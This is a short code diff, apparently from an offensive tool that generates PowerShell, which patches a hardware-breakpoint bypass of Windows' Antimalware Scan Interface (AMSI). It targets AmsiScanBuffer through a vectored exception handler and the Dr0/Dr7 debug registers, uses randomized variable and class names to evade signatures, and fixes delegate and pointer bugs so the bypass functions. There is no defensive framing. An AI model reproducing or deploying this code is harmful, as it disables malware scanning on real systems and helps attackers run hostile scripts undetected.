@@ -507,13 +507,13 @@ Add-Type $${vType}
 $${vLib} = [${className}]::LoadLibrary('amsi.dll')
 $${vAddr} = [${className}]::GetProcAddress($${vLib}, 'AmsiScanBuffer')
 [${className}]::SetTarget($${vAddr})
-$${vHandler} = [${className}+VEH]::new([${className}], 'Handler')
+$${vHandler} = [Delegate]::CreateDelegate([${className}+VEH],[${className}].GetMethod('Handler'))
 [${className}]::AddVectoredExceptionHandler(1, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($${vHandler}))
 $ctx = New-Object ${className}+CONTEXT
 $ctx.ContextFlags = 0x100010
 $thread = [${className}]::GetCurrentThread()
 [${className}]::GetThreadContext($thread, [ref]$ctx)
-$ctx.Dr0 = [uint64]$${vAddr}
+$ctx.Dr0 = [uint64]$${vAddr}.ToInt64()
 $ctx.Dr7 = $ctx.Dr7 -bor 1
 [${className}]::SetThreadContext($thread, [ref]$ctx)`;
 
